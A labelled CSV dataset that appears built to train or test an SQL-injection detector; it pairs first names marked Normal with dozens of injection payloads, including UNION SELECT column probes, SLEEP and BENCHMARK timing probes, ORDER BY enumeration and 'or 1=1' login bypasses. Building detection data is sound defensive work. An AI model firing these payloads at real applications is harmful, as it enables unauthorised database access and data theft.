query,label
query,Normal
'John',Normal
'Fran',Normal
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
"'1)) or benchmark(10000000,MD5(1))#'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
'ORDER BY 2#',SQL Injection
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
"'admin""""/*'",SQL Injection
'' AND id IS NULL; --',SQL Injection
'Alice',Normal
'Hank',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Jill',Normal
'Grace',Normal
'John',Normal
'John',Normal
'Alice',Normal
"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
'Alice',Normal
'Hank',Normal
'Bob',Normal
'Charlie',Normal
'||		(double pipe) concatenate',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
''=0--+',SQL Injection
'David',Normal
'Hank',Normal
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Alice',Normal
'Alice',Normal
'Charlie',Normal
'Hank',Normal
'John',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
"'+benchmark(3200,SHA1(1))+''",SQL Injection
'John',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
'AND 7300=7300 AND ('pKlZ'='pKlY',SQL Injection
'John',Normal
'ORDER BY 1',SQL Injection
"'admin""""/*'",SQL Injection
'Alice',Normal
"'and (select substring(@@version,3,1))='S''",SQL Injection
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
'Alice',Normal
'Jill',Normal
'Hank',Normal
'WHERE 1=1 AND 1=1--',SQL Injection
'pg_SLEEP(5)--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'Eve',Normal
'admin'or 1=1 or ''='',SQL Injection
'Charlie',Normal
"'benchmark(50000000,MD5(1))--'",SQL Injection
'David',Normal
'Fran',Normal
'ORDER BY 27',SQL Injection
'Hank',Normal
'Alice',Normal
'#	    Hash comment',SQL Injection
'Bob',Normal
'John',Normal
"'') or benchmark(10000000,MD5(1))#'",SQL Injection
'Charlie',Normal
'Fran',Normal
'admin' #',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
'%		wildcard attribute indicator',SQL Injection
'Grace',Normal
"'UNION ALL SELECT 1,2--'",SQL Injection
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
''',SQL Injection
